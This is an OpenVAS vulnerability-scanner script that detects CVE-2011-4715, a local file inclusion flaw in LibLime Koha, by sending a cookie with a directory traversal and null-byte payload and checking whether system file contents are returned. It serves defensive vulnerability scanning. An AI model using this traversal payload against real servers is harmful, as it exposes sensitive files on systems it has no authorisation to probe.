###############################################################################
# OpenVAS Vulnerability Test
#
# LibLime Koha 'KohaOpacLanguage' Parameter Local File Inclusion Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (C) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902593");
  script_version("2021-04-16T06:57:08+0000");
  script_cve_id("CVE-2011-4715");
  script_bugtraq_id(50812);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)");
  script_tag(name:"creation_date", value:"2011-11-29 17:17:17 +0530 (Tue, 29 Nov 2011)");
  script_name("LibLime Koha 'KohaOpacLanguage' Parameter Local File Inclusion Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://secunia.com/advisories/46980/");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18153");
  script_xref(name:"URL", value:"http://www.vigasis.com/en/?guncel_guvenlik=LibLime%20Koha%20%3C=%204.2%20Local%20File%20Inclusion%20Vulnerability&lnk=exploits/18153");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to obtain
  potentially sensitive information and execute arbitrary local scripts in the
  context of the Web server process.");

  script_tag(name:"affected", value:"LibLime Koha versions 4.02.06 and prior.");

  script_tag(name:"insight", value:"The flaw is due to the cgi-bin/opac/opac-main.pl script not
  properly sanitizing user input supplied to the cgi-bin/koha/mainpage.pl script
  via the 'KohaOpacLanguage' cookie. This can be exploited to include arbitrary
  files from local resources via directory traversal attacks and URL-encoded NULL bytes.");

  script_tag(name:"solution", value:"Upgrade to version 4.5 Build 4500 or higher.");

  script_tag(name:"summary", value:"The host is running LibLime Koha and is prone to local file
  inclusion vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("host_details.inc");
include("os_func.inc");

port = http_get_port(default:80);

foreach dir (make_list_unique("/", "/koha", http_cgi_dirs(port:port))) {

  if(dir == "/") dir = "";
  url = dir + "/opac-main.pl";

  res = http_get_cache(item:url, port:port);

  if("koha" >< res && "Library" >< res) {

    files = traversal_files();
    req = http_get(item:url, port:port);

    foreach file (keys(files)) {

      cookie = "sessionID=1;KohaOpacLanguage=../../../../../../../../" + files[file] + "%00";
      req1 = string(chomp(req), '\r\nCookie: ', cookie, '\r\n\r\n');
      res = http_keepalive_send_recv(port:port, data:req1);

      if(egrep(pattern:file, string:res)) {
        report = http_report_vuln_url(port:port, url:url);
        security_message(port:port, data:report);
        exit(0);
      }
    }
  }
}

exit(99);
